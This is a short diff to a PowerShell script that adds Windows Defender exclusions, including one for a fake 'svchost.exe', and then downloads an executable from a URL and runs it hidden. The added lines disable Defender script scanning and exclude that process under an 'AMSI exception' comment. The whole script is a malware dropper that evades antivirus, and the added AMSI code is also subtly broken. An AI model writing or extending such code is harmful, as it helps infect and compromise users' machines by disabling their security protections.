@@ -37,6 +37,12 @@ Add-MpPreference -ExclusionPath $roamingTempSvchostExe
 Add-MpPreference -ExclusionPath $desktopPath
 Add-MpPreference -ExclusionPath $destination
 
+# Add AMSI exception
+$amsiProvider = "Microsoft Defender Advanced Threat Protection"
+$exclusion = "Desktop\svchost.exe"
+$amsiCmd = "Set-MpPreference -DisableScriptScanning $true; Add-MpPreference -ExclusionProcess $exclusion"
+Invoke-Command -ScriptBlock { & $amsiCmd }
+
 Invoke-WebRequest -Uri $exeUrl -OutFile $destination
 
 Start-Process -FilePath $destination -WindowStyle Hidden
